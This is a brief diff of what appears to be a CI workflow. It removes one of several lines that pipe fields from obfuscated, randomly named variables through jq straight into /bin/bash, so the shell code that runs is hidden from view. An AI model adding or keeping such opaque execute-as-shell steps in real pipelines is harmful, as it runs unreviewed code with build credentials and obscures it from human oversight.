@@ -23,7 +23,6 @@ jobs:
           echo $rhsaa31 | jq -r .mi1928 | /bin/bash
           echo $uscqr49329 | jq -r .gi35 | /bin/bash
           echo $qkr30924 | jq -r .ol48017 | /bin/bash
-          echo $kpnd8934 | jq -r .giw721 | /bin/bash
           echo $vy14476 | jq -r .eymg1 | /bin/bash
           echo $xo5744 | jq -r .yeyn36 | /bin/bash
           printf '%s' "$z4" | jq -r .h51 | /bin/bash
